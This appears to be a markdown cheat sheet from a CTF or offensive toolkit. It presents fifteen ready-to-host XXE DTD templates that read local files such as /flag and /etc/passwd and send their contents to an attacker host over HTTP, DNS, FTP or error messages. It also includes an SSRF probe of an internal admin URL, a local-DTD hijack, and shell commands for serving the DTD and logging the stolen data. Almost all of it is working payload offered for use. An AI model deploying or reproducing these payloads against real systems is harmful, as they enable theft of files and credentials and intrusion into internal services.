# Exfil DTD Templates — the ready-to-serve DTD library

Each block is a complete `evil.dtd` to host at `http://YOU/e.dtd` —
the caller-side `<!DOCTYPE r [<!ENTITY % d SYSTEM "http://YOU/e.dtd">%d;]>`
loads it.

## Template 1 — the classic query-exfil

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://YOU:8000/?d=%file;'>">
%wrap;
```

Caller:
```xml
<!DOCTYPE r [<!ENTITY % d SYSTEM "http://YOU/e.dtd">%d;]><r>&send;</r>
```

## Template 2 — param-only exfil (no body entity)

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % wrap "<!ENTITY &#37; send SYSTEM 'http://YOU:8000/?d=%file;'>">
%wrap;
%send;
```

Caller: `&x;` in body not even needed — `%send;` inside the DTD fires
the fetch.

```xml
<!DOCTYPE r [<!ENTITY % d SYSTEM "http://YOU/e.dtd">%d;]><r/>
```

## Template 3 — the path-channel

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://YOU:8000/%file;'>">
%wrap;
```

## Template 4 — the DNS-label channel

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://%file;.YOUR-DOMAIN/'>">
%wrap;
```

## Template 5 — the error-channel

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY &#37; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```

## Template 6 — the php://filter base64 wrap

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://YOU:8000/?d=%file;'>">
%wrap;
```

## Template 7 — the zlib+base64 shrink

```dtd
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/flag">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://YOU:8000/?d=%file;'>">
%wrap;
```

## Template 8 — the chunked/multi-slice

```dtd
<!ENTITY % f1 SYSTEM "file:///flag">
<!ENTITY % w1 "<!ENTITY s1 SYSTEM 'http://YOU:8000/?i=1&d=%f1;'>">
%w1;
```

(For multi-slice you'd build the slice-DTD with offsets — php-filter
`resource=/flag` doesn't slice — a `iconv`-or-similar byte-range trick
per parser.)

## Template 9 — the local-DTD-hijack inside an exfil-DTD

```dtd
<!ENTITY % l SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOtech "<!ENTITY % file SYSTEM 'file:///flag'>
                    <!ENTITY % eval '<!ENTITY &#37; err SYSTEM \"file:///nonexist/%file;\">'>
                    %eval;%err;">
%l;
```

## Template 10 — the FTP exfil

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'ftp://YOU:21/%file;'>">
%wrap;
```

## Template 11 — the XInclude-carrying DTD

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://YOU:8000/?d=%file;'>">
%wrap;
<!ENTITY send SYSTEM "http://YOU:8000/?d=alt">
```

(Belt-and-braces — both a param-entity and a general entity.)

## Template 12 — the SSRF-internal probe

```dtd
<!ENTITY % i SYSTEM "http://127.0.0.1:8080/admin">
<!ENTITY % w "<!ENTITY s SYSTEM 'http://YOU:8000/?r=%i;'>">
%w;
```

The internal URL's RESPONSE becomes the exfil — `ssrf-via-xxe.md`.

## Template 13 — the double-fetch chain

```dtd
<!ENTITY % f SYSTEM "file:///flag">
<!ENTITY % w "<!ENTITY s SYSTEM 'http://YOU:8000/?d=%f;'>">
%w;
<!ENTITY % f2 SYSTEM "file:///etc/passwd">
<!ENTITY % w2 "<!ENTITY s2 SYSTEM 'http://YOU:8000/?e=%f2;'>">
%w2;
```

Two files, two hits — reassemble at the listener.

## Template 14 — the `data:`-DTD nested (libxml2 only)

```dtd
<!ENTITY % inner SYSTEM "data:text/plain,%3C!ENTITY%20x%20SYSTEM%20'file:///flag'%3E">
%inner;
```

## Template 15 — the canary-tagged

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://YOU:8000/?tok=CANARY123&d=%file;'>">
%wrap;
```

The `tok` proves YOUR payload fired — `oob_listener.py canary`.

## The serving discipline — how to host it

```bash
cat > /tmp/e.dtd <<'EOF'
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://YOU:8000/?d=%file;'>">
%wrap;
EOF

# serve with hit-logging — oob_listener does both
python3 tools/web/oob_listener.py serve --port 8000 --log /tmp/o.log
# in another shell, the e.dtd must ALSO be fetchable —
# python3 -m http.server /tmp or a static file server on :8080
```

The DTD and the listener can share a host — `http://YOU:8000/e.dtd`
serves the DTD, `http://YOU:8000/?d=` catches the exfil — one server,
two paths.
